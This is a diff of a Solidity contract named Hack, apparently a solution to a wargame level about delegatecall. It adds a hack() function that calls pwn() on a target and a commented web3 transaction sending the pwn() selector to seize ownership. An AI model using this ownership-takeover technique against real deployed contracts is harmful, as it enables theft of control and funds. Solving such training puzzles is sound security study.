@@ -36,55 +36,38 @@ function getSender() public view returns(address) {
   }
 }
 
+
 interface DelegationI { 
   function owner() external view returns(address);
-  function getSender() external view returns(address);
   function pwn() external;
 }
 
 contract Hack  {
    
-    address external_contract;
-    DelegationI external_contract_i;
-
-    address public constant OTHER_CONTRACT = 0xC4FA8Ef3914b2b09714Ebe35D1Fb101F98aAd13b;
+    DelegationI external_contract;
 
     constructor(address _delegateAddress){
-        external_contract = _delegateAddress;
-        external_contract_i = DelegationI(_delegateAddress);
+        external_contract = DelegationI(_delegateAddress);
     }
 
-    function getOwner() public returns(bytes memory) {
-        (bool success, bytes memory data) = external_contract.call(abi.encodeWithSignature("owner()"));
-        require(success);
-        return data;
-    }
-
-    function getOwner1() public view returns(address) {
-        return external_contract_i.owner();
-    }
-
-    function getSender() public view returns(address) {
-        return external_contract_i.getSender();
-    }
-
-    function pwn1() public {
-        external_contract_i.pwn();
-    }
-
-    function getTest() public returns(bytes memory) {
-        (bool success, bytes memory data) = external_contract.call(abi.encodeWithSignature("getSender()"));
-        require(success);
-        return data;
+    function getOwner() public view returns(address) {
+        return external_contract.owner();
     }
 
     function getData() public pure returns(bytes memory) {
         return abi.encodeWithSignature("pwn()");
     }
 
-    function pwn() public {
-        (bool success,) = external_contract.delegatecall(msg.data);
-        require(success);
+    /**
+    await sendTransaction({
+      from: (await web3.eth.getAccounts())[0],
+      to: contract.address,
+      data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
+    });
+    **/
+    function hack() public {
+      (bool success,) = address(external_contract).call(abi.encodeWithSignature("pwn()"));
+      require(success);
     }
 
 }
